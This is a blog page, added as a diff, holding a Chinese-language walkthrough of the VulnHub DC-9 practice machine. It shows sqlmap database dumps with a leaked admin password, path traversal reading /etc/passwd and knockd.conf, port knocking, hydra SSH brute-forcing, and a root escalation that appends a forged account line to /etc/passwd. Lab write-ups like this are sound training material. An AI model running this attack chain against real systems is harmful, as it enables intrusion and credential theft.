@@ -1,0 +1,703 @@
+
+
+<!DOCTYPE html>
+<html lang="zn-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/1.jpg">
+  <link rel="icon" href="/img/7.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="信息搜集 主机发现 1sudo netdiscover 192.168.12.0&#x2F;24 发现目标主机IP为192.168.12.132 端口探测 123nmap -sS -sV -A -n 192.168.12.132nmap -p- -A -T5 192.168.12.132nmap -T4 -sV -A -O -p- 192.168.12.132  第一种和第二种扫描结果基本一样，第二种明显慢">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC9">
+<meta property="og:url" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/index.html">
+<meta property="og:site_name" content="Bubble&#39;s Blog">
+<meta property="og:description" content="信息搜集 主机发现 1sudo netdiscover 192.168.12.0&#x2F;24 发现目标主机IP为192.168.12.132 端口探测 123nmap -sS -sV -A -n 192.168.12.132nmap -p- -A -T5 192.168.12.132nmap -T4 -sV -A -O -p- 192.168.12.132  第一种和第二种扫描结果基本一样，第二种明显慢">
+<meta property="og:locale" content="zn_CN">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/1.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/2.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/3.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/4.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/5.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/6.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/7.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/8.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/9.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/10.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/11.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/12.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/13.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/14.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/15.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/16.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/17.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/18.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/19.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/20.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/21.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/22.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/23.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/24.jpg">
+<meta property="article:published_time" content="2024-02-24T07:49:38.471Z">
+<meta property="article:modified_time" content="2024-02-24T08:41:30.965Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ybubble.github.io/2024/02/24/vulnhub%E2%80%94DC9/1.jpg">
+  
+  
+  
+  <title>DC9 - Bubble&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/KaTeX/0.16.2/katex.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ybubble.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Bubble</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Category</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/3.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DC9"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-24 15:49" pubdate>
+          February 24, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">DC9</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1>信息搜集</h1>
+<h2 id="主机发现">主机发现</h2>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> netdiscover <span class="hljs-number">192.168.12.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+<p>发现目标主机IP为192.168.12.132</p>
+<h2 id="端口探测">端口探测</h2>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">nmap -sS -sV -<span class="hljs-keyword">A</span> -n <span class="hljs-number">192.168.12.132</span><br>nmap -p- -<span class="hljs-keyword">A</span> -T<span class="hljs-number">5 192.168.12</span>.<span class="hljs-number">132</span><br>nmap -T4 -sV -<span class="hljs-keyword">A</span> -O -p- <span class="hljs-number">192.168.12.132</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/1.jpg" srcset="/img/loading.gif" lazyload class=""><img src="/2024/02/24/vulnhub%E2%80%94DC9/2.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>第一种和第二种扫描结果基本一样，第二种明显慢</p>
+<p>第三种每个端口下对应信息更多，速度和第二种差不多</p>
+<p>22端口被过滤，80端口开放</p>
+<h2 id="访问网页，寻找可能的漏洞">访问网页，寻找可能的漏洞</h2>
+<h3 id="查找输入框">查找输入框</h3>
+<p>在Search中发现提交框</p>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/3.jpg" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/4.jpg" srcset="/img/loading.gif" lazyload class="">
+<h3 id="查找提交字段名">查找提交字段名</h3>
+<p>抓包发现字段名为‘search’</p>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/5.jpg" srcset="/img/loading.gif" lazyload class="">
+<h1>SQL注入</h1>
+<h2 id="爆破数据库">爆破数据库</h2>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">sqlmap</span> -u <span class="hljs-string">&quot;http://192.168.12.132/results.php&quot;</span> --<span class="hljs-meta">data</span> <span class="hljs-string">&quot;search=1&quot;</span> -dbs<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/6.jpg" srcset="/img/loading.gif" lazyload class="">
+<h3 id="爆破数据库users">爆破数据库users</h3>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.12.132/results.php&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;search=1&quot;</span> -D users <span class="hljs-params">--tables</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/7.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>爆破表中所有信息，列出管理员账号密码</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.12.132/results.php&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;search=1&quot;</span> -D users -T UserDetails <span class="hljs-params">--dump</span><br></code></pre></td></tr></table></figure>
+<p>好像没有类似于管理员的信息</p>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/8.jpg" srcset="/img/loading.gif" lazyload class="">
+<h3 id="爆破数据库staff">爆破数据库staff</h3>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.12.132/results.php&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;search=1&quot;</span> -D Staff <span class="hljs-params">--tables</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/9.jpg" srcset="/img/loading.gif" lazyload class="">
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://192.168.12.132/results.php&quot;</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;search=1&quot;</span> -D Staff -T users <span class="hljs-params">--dump</span><br></code></pre></td></tr></table></figure>
+<p>获取到管理员账号和密码：admin；transorbital1</p>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/10.jpg" srcset="/img/loading.gif" lazyload class="">
+<h2 id="管理员登录">管理员登录</h2>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/11.jpg" srcset="/img/loading.gif" lazyload class="">
+<h1>文件包含</h1>
+<p>提示：File does not exist</p>
+<p>猜测可能是文件包含漏洞</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>端口试探（port knocking）是一种通过连接尝试，从外部打开原先关闭端口的方法。一旦收到正确顺序的连接尝试，防火墙就会动态打开一些特定的端口给允许尝试连接的主机。</p>
+<p>端口试探类似于一次秘密握手协议，比如一种最基本的方式：发送一定序列的UDP、TCP数据包。当运行在主机上的daemon程序捕捉到数据包以后，如果这个序列正确，则开启相应的端口，或者防火墙允许客户端通过。</p>
+<p>端口敲门是计算机等同于一个组合数字锁，恰当的组合数字解锁特定的TCP或UDP服务来远程访问。恰当的组合数字使所要求的服务从特定IP地址可见。否则，它仍然是隐藏的。 一些端口敲门程序依赖于发送数据到特定的UDP和/或TCP端口号，其他的使用ICMP信息，并且一些要求使用强加密的特定的客户端应用程序来发送解锁序列。重要的事情是记住端口敲门的概念是为一个特定的IP地址解锁并访问特定的TCP或UDP服务。</p>
+</blockquote>
+<h1>端口敲门</h1>
+<h2 id="方法一：knockd">方法一：knockd</h2>
+<p>knockd服务的默认配置路径：/etc/knockd.conf</p>
+<p>使用文件包含漏洞遍历，获取敲门的密码：sequence = 7469,8475,9842</p>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/12.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>安装knockd服务</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> install knockd<br></code></pre></td></tr></table></figure>
+<p>编辑配置文件</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> /etc/knockd.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/13.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>敲门</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">knock</span> <span class="hljs-number">192.168.12.132</span> <span class="hljs-number">7469</span> <span class="hljs-number">8475</span> <span class="hljs-number">9842</span><br></code></pre></td></tr></table></figure>
+<p>再次查看端口开放情况</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> nmap -p <span class="hljs-number">22</span> <span class="hljs-number">192.168.12.132</span><br></code></pre></td></tr></table></figure>
+<p>22端口成功被打开</p>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/14.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>把原来users数据库中的用户名和对应密码保存下来</p>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/15.jpg" srcset="/img/loading.gif" lazyload class="">
+<h2 id="方法二：nc">方法二：nc</h2>
+<p>依次输入：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">192.168.12.132</span> <span class="hljs-number">7469</span><br><span class="hljs-attribute">nc</span> <span class="hljs-number">192.168.12.132</span> <span class="hljs-number">8475</span><br><span class="hljs-attribute">nc</span> <span class="hljs-number">192.168.12.132</span> <span class="hljs-number">9842</span><br></code></pre></td></tr></table></figure>
+<h1>hydra爆破</h1>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">hydra -L username -P <span class="hljs-keyword">pwd</span> ssh:<span class="hljs-string">//192.168.12.132</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/16.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>用提示的3个用户进行登录，发现有用信息</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> joeyt@<span class="hljs-number">192.168.12.132</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/17.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>没有什么信息</p>
+<p>权限不够的用户输入<code>sudo -l</code>会提示：Sorry, user janitor may not run sudo on dc-9.</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> janitor@<span class="hljs-number">192.168.12.132</span><br></code></pre></td></tr></table></figure>
+<p>发现隐藏文件secrets-for-putin</p>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/18.jpg" srcset="/img/loading.gif" lazyload class="">
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> secrets-for-putin<br></code></pre></td></tr></table></figure>
+<p>添加密码再次爆破</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">hydra -L username -P <span class="hljs-keyword">pwd</span> ssh:<span class="hljs-string">//192.168.12.132</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/19.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>发现一个新用户</p>
+<p>用该用户的身份进行登录，输入sudo -l，列出权限，发现“root”</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> fredf@<span class="hljs-number">192.168.12.132</span><br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/20.jpg" srcset="/img/loading.gif" lazyload class="">
+<h1>本地提权</h1>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd opt<span class="hljs-regexp">/devstuff/</span>dist<span class="hljs-regexp">/test/</span><br></code></pre></td></tr></table></figure>
+<p>运行test，发现是一个python文件</p>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/21.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>查找python文件并查看</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -name test.py <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+<p>大概的就是将参数1的内容写到参数2中然后生成一个用户</p>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/22.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>创建一个admin用户</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> passwd -<span class="hljs-number">1</span> -salt admin <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure>
+<p>把/etc/passwd的格式修改一下 然后写入/tmp</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">echo</span> <span class="hljs-string">&#x27;admin:<span class="hljs-variable">$1</span><span class="hljs-variable">$admin</span><span class="hljs-variable">$LClYcRe</span>.ee8dQwgrFc5nz.:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /tmp/passwd<br></code></pre></td></tr></table></figure>
+<p>运行test</p>
+<p>注意执行这条语句需要进入这个目录/opt/devstuff/dist/test</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ./test /tmp/passwd.txt /etc/passwd<br></code></pre></td></tr></table></figure>
+<p>查看</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>passwd <br></code></pre></td></tr></table></figure>
+<p>切换admin用户</p>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/23.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>获取flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root<br><span class="hljs-built_in">cat</span> thefalg.txt<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/24/vulnhub%E2%80%94DC9/24.jpg" srcset="/img/loading.gif" lazyload class="">
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/vulnhub%E9%9D%B6%E5%9C%BA/" class="category-chain-item">vulnhub靶场</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/02/24/VulnHub%E9%9D%B6%E5%9C%BA%E2%80%94CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="CFS三层靶机内网渗透">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CFS三层靶机内网渗透</span>
+                        <span class="visible-mobile">Vorheriger</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/24/vulnhub%E2%80%94DC3-2/" title="DC3-2">
+                        <span class="hidden-mobile">DC3-2</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Inhaltsverzeichnis</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a target="_blank" rel="nofollow noopener"><span>🐟</span></a> <a target="_blank" rel="nofollow noopener"><span>🐟</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
